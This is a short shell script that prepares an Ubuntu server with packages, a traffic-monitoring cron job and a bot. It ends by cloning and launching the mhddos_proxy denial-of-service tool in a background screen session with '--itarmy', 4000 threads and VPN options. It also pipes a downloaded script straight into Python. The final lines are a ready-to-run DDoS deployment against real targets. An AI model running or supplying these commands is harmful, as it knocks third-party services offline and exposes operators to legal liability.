sudo apt update -y
sudo apt upgrade -y
sudo apt install screen -y
sudo apt upgrade screen -y
sudo apt update -y
sudo apt upgrade -y
sudo apt install wget -y
sudo apt upgrade wget -y
sudo apt install git -y
sudo apt upgrade git -y
sudo apt install tar -y
sudo apt upgrade tar -y
sudo apt install slurm
sudo apt install net-tools -y
sudo apt upgrade net-tools -y
sudo apt-get install php -y
sudo apt-get upgrade php -y
sudo apt-get install php-curl -y
sudo apt-get upgrade php-curl -y
sudo add-apt-repository ppa:deadsnakes/ppa -y
sudo apt install python3.8 -y
curl -sS https://bootstrap.pypa.io/get-pip.py | python3.8
python3.8 -m pip install -r requirements.txt

python3 -m venv tutorial-env
source tutorial-env/bin/activate
sudo apt install vnstat
sudo service vnstat start
sudo vnstat -u
sudo crontab -e
 * * * * * vnstat -u >/dev/null 2>&1 
./build.sh
sudo apt-get install screen
screen -dmS ServerBot python3 bot.py -token config.txt

git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git && cd ~/mhddos_proxy && python3.8 -m pip install -r requirements.txt
screen -dmS "mhddos_proxy" ./runner.sh python3.8 -t 4000 --lang en --itarmy --vpn





